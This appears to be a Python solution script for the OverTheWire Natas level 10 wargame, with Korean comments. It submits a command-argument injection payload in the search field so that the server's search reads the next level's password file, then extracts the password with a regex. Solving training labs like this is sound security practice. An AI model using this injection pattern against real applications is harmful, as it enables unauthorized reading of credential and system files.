import requests
import re

url = "http://natas10.natas.labs.overthewire.org/"
payload = "^ /etc/natas_webpass/natas11 #"

# natas10 로그인 정보 (natas9를 풀면 얻는 비밀번호)
# 직접 풀어서 본인 값으로 교체하세요
recent_level_pass = "여기에_본인_비밀번호"

param = {
  "needle": payload,
  "submit": "Search"
}

s = requests.Session()
s.auth = ("natas10", recent_level_pass)

print("[*] 타겟 서버에 페이로드 전송 및 취약점 공격 중...")
response = s.get(url, params=param)

print("[*] 서버 응답 데이터에서 패스워드 추출 및 필터링 중...")
pattern = r"[a-zA-Z0-9]{32}"
matches = re.findall(pattern, response.text)

result = [m for m in matches if m != recent_level_pass]

if result:
  print(f"[+] 공격 성공! 나타스11의 비밀번호는 ===> {result[0]}")
  #print(f"[*] 나타스11의 비밀번호는 ===> {''.join(result)}")         #이렇게 join써도 가능
else:
  print("[-]필터링된 값이 없으니 직접 html 코드에서 찾으세요")
  print(response.text)
